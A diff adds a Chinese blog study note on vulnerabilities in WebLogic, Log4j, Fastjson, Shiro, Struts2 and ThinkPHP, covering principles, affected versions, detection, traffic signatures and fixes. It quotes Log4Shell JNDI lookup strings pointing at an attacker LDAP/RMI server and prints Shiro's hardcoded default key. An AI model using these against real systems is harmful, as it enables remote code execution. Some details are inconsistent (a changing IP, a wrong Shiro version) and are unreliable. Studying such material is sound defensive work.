@@ -5321,4 +5321,116 @@ height: 100%; left: 0; top: 0;"> </iframe></div>
         <tag>漏洞</tag>
       </tags>
   </entry>
+  <entry>
+    <title>web框架及中间件、组件漏洞</title>
+    <url>/2024/03/31/web%E6%A1%86%E6%9E%B6%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>WebLogic 是美国 Oracle 公司出品的一个基于 JAVAEE 架构的<strong>中间件</strong>，是用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用的Java应用服务器。WebLogic 由纯 Java 开发，长期以来一直被认为是市场上最好的J2EE工具之一，被广泛应用于开发、部署和运行 Java 应用等适用于本地环境和云环境的企业应用。</p>
+<p>默认端口是7001</p>
+<h3 id="Weblogic弱口令-文件读取漏洞"><a href="#Weblogic弱口令-文件读取漏洞" class="headerlink" title="Weblogic弱口令&#x2F;文件读取漏洞"></a>Weblogic弱口令&#x2F;文件读取漏洞</h3><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>这里有两个漏洞。</p>
+<p><strong>弱口令漏洞</strong>原理是因为在搭建好Weblogic后没有修改后台的默认密码或者密码设置太简单，导致存在弱口令登录，获取服务器管理员权限。</p>
+<p><strong>文件读取漏洞</strong>是因为对用户输入内容没有进行限制与过滤，导致可以读取任意文件。</p>
+<h3 id="Weblogic未授权远程命令执行漏洞"><a href="#Weblogic未授权远程命令执行漏洞" class="headerlink" title="Weblogic未授权远程命令执行漏洞"></a>Weblogic未授权远程命令执行漏洞</h3><h4 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>允许未授权的用户绕过管理控制台的权限验证访问后台，进入后台后，又允许任意用户通过HTTP协议执行任意命令。</p>
+<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0、14.1.1.0.0</p>
+<h3 id="Weblogic-SSRF漏洞"><a href="#Weblogic-SSRF漏洞" class="headerlink" title="Weblogic SSRF漏洞"></a>Weblogic SSRF漏洞</h3><h4 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Weblogic的uddi组件实现包中有个ddiexplorer.war文件，其下的SearchPublicReqistries.jsp接口存在SSRF漏洞，可以利用该漏洞可以发送任意HTTP请求，实现攻击内网中Redis等脆弱组件。</p>
+<h4 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h4><p>10.0.2、10.3.6</p>
+<h3 id="Weblogic-XMLDecoder反序列化漏洞"><a href="#Weblogic-XMLDecoder反序列化漏洞" class="headerlink" title="Weblogic XMLDecoder反序列化漏洞"></a>Weblogic XMLDecoder反序列化漏洞</h3><h4 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>WLS-WSAT是Weblogic Server事务管理的一个组件，它使用Java的反序列化机制来处理数据，调用XMLDecoder类<strong>将用户传入的XML数据转换成Java对象</strong>。</p>
+<p>在某些情况下攻击者可以构造恶意的序列化数据作为POST请求的一部分发送到Weblogic Server的T3协议端口（默认为7001），并且在请求头中设置一个特殊的“Content-Type”值来触发漏洞。当Weblogic Server处理该请求时，XMLDecoder将恶意的序列化数据反序列为Java对象，并执行其中的恶意代码。</p>
+<p>T3协议是Weblogic用于通信的独有的一个协议，Weblogic Server的RMI通信使用它在其他区的Java程序（包括服务端，客户端等）传输数据。</p>
+<p><code>ac ed 00 05</code>是反序列化标志，而在T3每个序列化数据包前面都有<code>fe 01 00 00</code></p>
+<h4 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h4><p>10.3.6.0.0、12.1.3.0.0、12.2.1.1.0、12.2.1.2.0</p>
+<hr>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
+<li>文章讲了任意文件读取和弱口令登录、未授权访问后台和HTTP请求远程代码执行、SSRF利用、XMLDecoder反序列化漏洞</li>
+<li>弱口令登录时因为Weblogic账号密码设置过于简单，任意文件读取是因为没有过滤和限制输入和访问，Weblogic的密码是通过AES对称加密的，所以可以读取密文文件config.xml和密钥文件SerializedSystemIni.dat</li>
+<li>远程代码执行可以使用两个类，第一个类ShellSession，直接构造函数参数然后url访问就可以进行命令执行；第二个类FileSystemXmlApplicationContext，需要借助存储有POC的XML文件，提前部署到被攻击者网站下任意目录，然后访问才能够达到触发效果</li>
+<li>存在SSRF漏洞的时候可以利用Redis等进行攻击</li>
+<li>XMLDecoder反序列化漏洞是因为会调用XMLDecoder来进行讲XML数据反序列化为Java对象，所以可以构造包含恶意文件的XML文件然后上传触发。这里需要将GET方法改为POST方法，增加Content-Type:text&#x2F;xml</li>
+<li>Weblogic扫描Weblogic-Scan的使用</li>
+</ul>
+<h2 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>ThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架，遵循Apache 2开源协议发布，使用面向对象的开发结构和MVC模式，融合了Struts的思想和TagLib（标签库）、RoR的ORM映射和ActiveRecord模式。</p>
+<p>ThinkPHP可以支持windows&#x2F;Unix&#x2F;Linux等服务器环境，正式版需要PHP 5.0以上版本，支持MySql、PgSQL、Sqlite多种数据库以及PDO扩展。</p>
+<p>由于有多个历史版本漏洞，请参考<a href="https://www.cnblogs.com/lingzhisec/p/15728886.html">https://www.cnblogs.com/lingzhisec/p/15728886.html</a></p>
+<h2 id="log4j"><a href="#log4j" class="headerlink" title="log4j"></a>log4j</h2><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>log4j是Apache的一个开源项目，是一个基于Java的日志记录框架。Log4j2是log4j的后继者，被大量用于业务系统开发，记录日志信息。很多互联网公司以及耳熟能详的公司的系统都在使用该框架。Apache Log4j2 组件在开启了日志记录功能后，凡是在可触发错误记录日志的地方，插入漏洞利用代码，即可利用成功。特殊情况下，若该组件记录的日志包含其他系统的记录日志，则有可能造成间接投毒。通过中间系统，使得组件间接读取了具有攻击性的漏洞利用代码，亦可间接造成漏洞触发。</p>
+<p>同时该漏洞还影响很多全球使用量的Top序列的通用开源组件，例如 Apache Struts2、Apache Solr、Apache Druid、Apache Flink等</p>
+<figure class="highlight gcode"><table><tr><td class="code"><pre><code class="hljs gcode">用户认证：不需要用户认证<br><br>触发方式：远程<br><br>配置方式：默认<br><br>利用条件：需要外网访问权限<br><br>影响版本：<span class="hljs-number">2.0</span> ≤ Apache Lo<span class="hljs-name">g4</span>j<span class="hljs-number">2</span> &lt; <span class="hljs-number">2.15</span><span class="hljs-number">.0</span>-rc<span class="hljs-number">2</span><br><br>利用难度：极低，无需授权即可远程代码执行<br><br>威胁等级：严重，能造成远程代码执行<br><br>综合评估漏洞利用难度极低，利用要求较少，影响范围很大，危害极其严重，且已经被黑客公开利用持续全网扫描，根据部里要求，需要紧急修复。<br></code></pre></td></tr></table></figure>
+
+<h3 id="漏洞原理-4"><a href="#漏洞原理-4" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>该漏洞的主要原因是log4j在日志输出中，未对字符合法性进行严格的限制，执行了<strong>JNDI（Java Naming and Directory Interface–Java命名和目录接口）</strong>协议加载的远程恶意脚本，从而造成RCE。</p>
+<p>java应用程序中可以调用JNDI协议访问远程服务，其底层包含了RMI、LDAP、DNS等协议的调用，说明白点，就是可以通过JNDI访问远程的相关目录服务，本次爆发的攻击payload都是通过jndi调用了远程的恶意class，然后本地反序列化执行。</p>
+<h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p> JNDI（Java Naming and Directory Interface，JAVA命名和目录接口）：它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。JNDI下面有很多目录接口，用于不同的数据源的查找引用。</p>
+<p> <strong>JNDI注入主要是用过下载远程class，来运行恶意代码。JNDI注入攻击时常用的就是通过RMI和LDAP两种服务。</strong></p>
+<h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>RMI全称是Remote Method Invocatioon，也就是<strong>远程方法调用</strong>，看起来和RPC（Remote Procedure Call）很像<br>实际上它俩的确很像，RMI算是JAVA定制版RPC吧</p>
+<p>一个完整的RMI调用过程，需要下面几个部分</p>
+<ol>
+<li>注册服务</li>
+<li>RMIServer</li>
+<li>客户端</li>
+<li>接口</li>
+<li>实现接口的类</li>
+</ol>
+<p><strong>执行流程如下</strong></p>
+<ol>
+<li>首先开启注册服务</li>
+<li>RMI创建实现接口的类的对象，并在注册服务中注册</li>
+<li>客户端从注册服务调用接口里的方法</li>
+</ol>
+<p><strong>通过RMI实现攻击的过程如下</strong></p>
+<p> log4j2 远程代码执行漏洞大致过程（此处使用RMI，LDAP同理）： 假设有一个Java程序，将用户名信息发送到了日志中，如下</p>
+<p>**a.**攻击者发送一个HTTP请求，其用户名为<code>$&#123;jndi://rmi服务器地址/Exploit&#125;</code></p>
+<p>**b.**被攻击服务器发现要输出的信息中有<code>$&#123;&#125;</code>，则其中的内容要单独处理，进一步解析是JNDI扩展内容且使用的是RMI，而后根据RMI服务器地址去请求Exploit。</p>
+<p>**c.**RMI服务器返回Reference对象（用于告诉请求端所请求对象所在的类），而该Reference指定了远端 文件下载服务器上含有恶意代码的class文件。</p>
+<p>**d.**被攻击服务器通过Reference对象去请求文件下载服务器上的class文件。</p>
+<p>**e.**被攻击服务器下载恶意class文件并执行其中的恶意代码</p>
+<p><img src="https://image.3001.net/images/20230421/1682046600_6441fe88511b0216164d6.png"></p>
+<h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><p>LDAP（Light Directory Access Portocol），它是基于X.500标准的跨平台的轻量级目录访问协议。</p>
+<p>LDAP是一种协议，<strong>轻量级目录访问的协议</strong>，说明它是实现，也是通过树形结构。<br>LDAP的中心概念是信息模型，它处理存储在目录中的信息种类和信息的结构。 信息模型围绕一个条目（即树的一个Node）进行，该条目是具有类型和值的属性的集合。 条目以树状结构组织，称为目录信息树。 这些条目是围绕现实世界的概念，组织，人员和对象组成的。 属性类型与定义允许信息的语法相关联。 单个属性可以在其中包含多个值。 LDAP中的专有名称从下至上读取。 左侧部分称为相对专有名称，右侧部分为基本专有名称。</p>
+<p>LDAP协议主要用于单点登录SSO(Single Sign on)，一个典型案例是：<br>学校的单点登录系统，只需要在这里登录，则教务、WebVPN、校园网等系统都可以直接访问，不需要但需登录（我们学习在使用单点登录之前，每个系统都要单独登录）</p>
+<p>LDAP可以用于SSO，但不等与SSO，这种协议还可以用于统一各种系统的认证方式、储存企业组织架构，员工信息（由于它使用树形结构，查询效率高）等等。</p>
+<p><strong>通过LDAP实现攻击的过程</strong></p>
+<p> 当用户输入信息时，应用程序中的log4j2组件会将信息记录到日志中</p>
+<p>**a.**假如日志中含有该语句<code>$&#123;jndi:ldap:192.168.96.1:1099/exp&#125;</code></p>
+<p>**b.**被攻击服务器发现要输出的信息中有<code>$&#123;&#125;</code>，log4j就会去解析该信息，通过jndi的lookup()方法去解析该URL：<code>ldap:192.168.96.1:1099/exp</code></p>
+<p>**c.**解析到ldap，就会去<code>192.168.61.129:1099</code>的ldap服务找名为exp的资源，如果找不到就会去http服务中找在http中找到exp之后，就会将资源信息返回给应用程序的log4j组件，而log4j组件就会下载下来，然后发现exp是一个.class文件，就会去执行里面的代码，从而实现注入攻击者就可以通过shell实现任意的命令执行，造成严重危害。</p>
+<h3 id="攻击流量特征"><a href="#攻击流量特征" class="headerlink" title="攻击流量特征"></a>攻击流量特征</h3><p>${jndi:}</p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1.升级到受影响版本的修复版：<br>（1）对于Apache Log4j 2.x 用户，建议升级到2.17.0版本以上。这些版本修复了漏洞，并包含其他安全增强措施。<br>（2）对于Apache Log4j 1.x 用户，目前官方并未针对1.x版本提供官方修复版。建议升级到Log4j 2.x版本，或者考虑使用其他日志记录库。</p>
+<p>2.阻止使用JNDI来加载远程资源：<br>如果您无法立即升级到修复版本，可以通过在Log4j配置中禁用使用JNDI来加载远程资源来减少风险。可以通过在log4j2.xml文件中将JndiLookup类从配置中移除或设置为安全的FallbackJndiLookup或DummyLookup来实现。</p>
+<p>3.启用安全策略：<br>为了进一步减少潜在的风险，应该考虑启用安全策略来限制代码执行。可以通过在log4j2.xml文件中添加安全策略配置来实现。</p>
+<p>4.清除受影响系统的缓存：<br>Log4j有一个缓存机制，可以存储已解析的XML配置。为了确保新的配置生效，您可能需要清除缓存。可以通过清除 Log4j 的上下文选择器缓存来实现。</p>
+<h2 id="FastJson"><a href="#FastJson" class="headerlink" title="FastJson"></a>FastJson</h2><h3 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h3><p>Fastjson是java的一个库，可以将Java对象转化为json格式的字符串，也可以将json格式的字符串转化为Java对象。</p>
+<p>Fastjson提供了<code>toJSONString()</code>和<code>parseObject()</code>方法来将Java对象与JSON相互转换。调用toJSONString()方法即可将对象转换成 JSON 字符串，parseObject()方法则反过来将JSON字符串转换成对象。</p>
+<h3 id="漏洞原理-5"><a href="#漏洞原理-5" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>在反序列化的时候，会进入<code>parseField()</code>方法，进入该方法后，就会调用<code>setValue(object, value)</code>方法，在这里，会执行构造的恶意代码，最后造成代码执行。</p>
+<p>首先需要指定一个恶意类，以让Java程序获取后进行反序列化操作。然后将需要执行的代码提供给程序，这里可使用LDAP或RMI协议。 然后反序列化的时候会去请求LDAP&#x2F;RMI服务器，与Log4j漏洞利用类似，加载这个恶意类文件从而引发代码执行漏洞。</p>
+<p>一般使用<strong>POST</strong>方法触发漏洞</p>
+<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>这里可以使用原始报错回显，如果站点有原始报错回显，可以用不闭合花括号的方式进行报错回显，报错中往往会有fastjson的字样。</p>
+<p>将content-type修改为application&#x2F;json后可向其POST数据，例如<code>&#123;&quot;name&quot;:&quot;</code>，若在返回报错页面中含有fastjson字段则可能存在漏洞</p>
+<p>也可以利用dnslog平台检测</p>
+<h3 id="攻击流量特征-1"><a href="#攻击流量特征-1" class="headerlink" title="攻击流量特征"></a>攻击流量特征</h3><p>json autotype(@type)</p>
+<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ol>
+<li>升级JDK</li>
+<li>升级Fastjson到最新版</li>
+<li>使用安全产品过滤</li>
+<li>更换其他序列化工具Jackson&#x2F;Gson</li>
+</ol>
+<h2 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h2><h3 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h3><p>Shiro是Apache的一个强大且易用的Java安全框架，<strong>用于执行身份验证、授权、密码和会话管理</strong>。借助Shiro易于理解的API，用户可以快速轻松地保护任何应用程序—-从最小的移动应用程序到最大的web和企业应用程序。</p>
+<h3 id="漏洞原理-6"><a href="#漏洞原理-6" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Apache Shiro框架在执行身份验证时提供了<strong>记住密码</strong>的功能（RememberMe），如果用户登录时勾选了这个选项，用户的请求数据包就会在Cookie字段中多出一段数据，这一段数据包含了加密后的用户信息，<strong>加密过程：用户信息&#x3D;&gt;序列化&#x3D;&gt;AES加密（密钥）&#x3D;&gt;base64编码&#x3D;&gt;添加到RememberMe Cookie字段。</strong></p>
+<p>勾选记住密码后，下次登录时，服务端进行对客户端的请求包的Cookie字段进行身份验证，无需登录即可访问，验证过程就是对RememberMe值先进行<strong>base64解码&#x3D;&gt;AES解密（密钥）&#x3D;&gt;反序列化</strong>。</p>
+<p>这里出现问题的点就在于，如果攻击者知道了AES加密的密钥，那么攻击者就可以把用户信息替换成恶意代码，这样在服务端对Cookie进行解密的时候就会造成反序列化漏洞。在Shiro&lt;&#x3D;1.2.24版本中使用了<strong>固定的密钥</strong>kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;。在后续的版本中，这个密钥也有可能会被爆破出来，从而被攻击者利用。</p>
+<h4 id="shiro721"><a href="#shiro721" class="headerlink" title="shiro721"></a>shiro721</h4><p>shiro721用到的加密方式是AES-CBC，而且其中的AES加密的key基本猜不到了，是系统随机生成的。而cookie解析过程跟cookie的解析过程一样，也就意味着如果能伪造恶意的rememberMe字段的值且目标含有可利用的攻击链的话，还是能够进行RCE的。只要<strong>知道已经登陆用户的合法cookie且目标服务器含有可利用的攻击链就可以进行漏洞利用。</strong></p>
+<h3 id="漏洞检测-1"><a href="#漏洞检测-1" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>首先登录页面判断了是否使用了Shiro框架进行身份验证，判断方法可以<strong>查看请求包中是否有RememberMe字段，响应包中是否有Set-cookie:rememberMe&#x3D;deleteMe字段。</strong></p>
+<h3 id="攻击流量特征-2"><a href="#攻击流量特征-2" class="headerlink" title="攻击流量特征"></a>攻击流量特征</h3><p>1.请求包Cookie的rememberMe中会存在AES+base64加密的一串java反序列化代码。</p>
+<p>2.返回包(漏洞机器返回给攻击机的数据包)中存在base64加密数据，该数据可作为攻击成功的判定条件。</p>
+<h3 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ul>
+<li>及时升级shiro版本，使用安全的密钥加密</li>
+<li>部署防火墙等措施提高安全性</li>
+</ul>
+<h2 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h2><h3 id="简介-5"><a href="#简介-5" class="headerlink" title="简介"></a>简介</h3><p>Struts 是Apache软件基金会（ASF）赞助的一个开源项目，通过采用JavaServlet&#x2F;JSP技术，实现基于Java EEWeb应用的MVC设计模式的应用框架，Struts 2是Struts的下一代产品，是在 Struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。<br>Struts2框架广泛应用于政府、公安、交通、金融行业和运营商的网站建设，作为网站开发的底层模板使用。Struts2漏洞，主要指的是J2EE开源框架struts2出现的命令执行漏洞，危害巨大，可导致远程执行任意系统命令，进而获取系统控制权，数据库控制权，导致信息泄露。</p>
+<h3 id="漏洞原理-7"><a href="#漏洞原理-7" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>OGNL是Object-Graph Navigation Language（对象-图导航语言）的缩写，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。OGNL一般是配合struts框架一起使用的，表达式语言一般是为了方便数据的存取所自定义的语言，然而攻击者却在Struts2中Ognl执行Java代码，同样的Elasticsearch可以用Groovy可以实现任意Java功能。</p>
+<p>内容太多了，具体可以去<a href="https://forum.butian.net/share/365%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8B">https://forum.butian.net/share/365了解一下</a></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
 </search>
